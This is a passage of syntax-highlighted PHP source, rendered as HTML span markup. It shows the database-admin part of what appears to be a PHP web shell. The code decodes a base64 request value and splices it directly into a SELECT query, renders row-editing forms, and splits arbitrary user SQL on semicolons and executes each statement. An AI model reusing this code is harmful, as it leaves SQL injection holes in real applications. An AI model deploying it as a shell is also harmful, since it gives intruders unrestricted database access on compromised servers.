<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #eeeeec;">tablename</span>.<span style="color: #ad7fa8; font-style: italic;">' table &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">where</span> = <span style="color: #eeeeec; background-color: #2e3436;">base64_decode(</span>$<span style="color: #eeeeec;">base64</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SELECT * FROM $tablename WHERE $where LIMIT 1"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">rs</span> = <span style="color: #eeeeec; background-color: #2e3436;">mysql_fetch_array(</span>$<span style="color: #eeeeec;">result</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form method="post" action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span>$<span style="color: #eeeeec;">dbform</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'tablename'</span>,$<span style="color: #eeeeec;">tablename</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span> ($<span style="color: #eeeeec;">rowdb</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">row</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">rs</span>[$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>]]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">value</span> = <span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">rs</span>[$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>]]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">value</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">thisbg</span> = <span style="color: #eeeeec; background-color: #2e3436;">bg(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''</span>.$<span style="color: #eeeeec;">thisbg</span>.<span style="color: #ad7fa8; font-style: italic;">'\';"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'UNI'</span> || $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Extra'</span>] == <span style="color: #ad7fa8; font-style: italic;">'auto_increment'</span> || $<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Key'</span>] == <span style="color: #ad7fa8; font-style: italic;">'PRI'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Type'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;&lt;td&gt;'</span>.$<span style="color: #eeeeec;">value</span>.<span style="color: #ad7fa8; font-style: italic;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Type'</span>].<span style="color: #ad7fa8; font-style: italic;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span>.$<span style="color: #eeeeec;">row</span>[<span style="color: #ad7fa8; font-style: italic;">'Field'</span>].<span style="color: #ad7fa8; font-style: italic;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span>.$<span style="color: #eeeeec;">value</span>.<span style="color: #ad7fa8; font-style: italic;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'insert'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;tr class="'</span>.<span style="color: #eeeeec; background-color: #2e3436;">bg(</span>).<span style="color: #ad7fa8; font-style: italic;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'base64'</span>, $<span style="color: #eeeeec;">base64</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">querys</span> = @<span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">';'</span>,$<span style="color: #eeeeec;">sql_query</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">querys</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">num</span>=&gt;$<span style="color: #eeeeec;">query</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">query</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">query</span>,<span style="color: #8ae234;">ENT_QUOTES</span>).<span style="color: #ad7fa8; font-style: italic;">"&lt;/b&gt;&lt;/p&gt;"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">switch</span>(<span style="color: #eeeeec; background-color: #2e3436;">qy(</span>$<span style="color: #eeeeec;">query</span>))
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">case</span> <span style="color: #8ae234;">0</span>:
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Error : '</span>.<span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>).<span style="color: #ad7fa8; font-style: italic;">'&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">break</span>;<span style="background-color: #404040;"> </span> 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">case</span> <span style="color: #8ae234;">1</span>:
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">strtolower(substr(</span>$<span style="color: #eeeeec;">query</span>,<span style="color: #eeeeec; background-color: #2e3436;">0</span>,<span style="color: #eeeeec; background-color: #2e3436;">13</span>)) == <span style="color: #ad7fa8; font-style: italic;">'select * from'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">allowedit</span> = <span style="color: #eeeeec; background-color: #2e3436;">1</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">getnumsql</span>) {
